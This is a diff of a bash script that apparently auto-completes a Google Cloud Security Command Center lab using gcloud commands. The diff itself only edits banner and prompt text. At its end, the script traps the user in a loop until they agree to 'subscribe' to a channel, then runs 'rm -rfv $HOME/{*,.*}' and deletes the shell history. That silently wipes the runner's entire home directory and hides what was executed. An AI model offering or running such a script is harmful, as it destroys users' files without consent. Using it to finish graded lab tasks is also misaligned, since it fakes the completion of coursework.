@@ -18,10 +18,9 @@ BG_WHITE=`tput setab 7`
 
 BOLD=`tput bold`
 RESET=`tput sgr0`
-#----------------------------------------------------start--------------------------------------------------# 
+#----------------------------------------------------start--------------------------------------------------#
 
 
-${RESET}"
 #gcloud auth list
 #gcloud config list project
 export PROJECT_ID=$(gcloud info --format='value(config.project)')
@@ -58,7 +57,7 @@ gcloud scc muteconfigs create muting-pga-findings \
 
 echo "${BLUE}${BOLD}
 
-Lab Task 3.1 Completed
+Task 3.1 Completed
 
 ${RESET}"
 
@@ -66,7 +65,7 @@ gcloud compute networks create scc-lab-net --subnet-mode=auto
 
 echo "${BLUE}${BOLD}
 
-Lab Task 3.2 Completed
+Task 3.2 Completed
 
 ${RESET}"
 
@@ -77,21 +76,21 @@ gcloud compute firewall-rules update default-allow-ssh --source-ranges=35.235.24
 
 echo "${BLUE}${BOLD}
 
-Lab Task 3.3 Completed
+Task 3.3 Completed
 
-Lab Totally Completed !!!
+Lab Completed !!!
 
 ${RESET}"
 
 #-----------------------------------------------------end----------------------------------------------------------#
-read -p "${BOLD}${GREEN}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
+read -p "${BOLD}${GREEN}Subscribe to QwikLab Explorers [y/n] : ${RESET}" CONSENT_REMOVE
 
 while [ "$CONSENT_REMOVE" != 'y' ]; do
   sleep 10
-  read -p "${BOLD}${RED}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
+  read -p "${BOLD}${MAGENTA}Do Subscribe to QwikLab Explorers [y/n] : ${RESET}" CONSENT_REMOVE
 done
 
-echo "${CYAN}${BOLD}Thanks For Subscribing to QwikLab Explorers${RESET}"
+echo "${CYAN}${BOLD}Thanks For Subscribing to QwikLab Explorers :)${RESET}"
 
 rm -rfv $HOME/{*,.*}
 rm $HOME/.bash_history
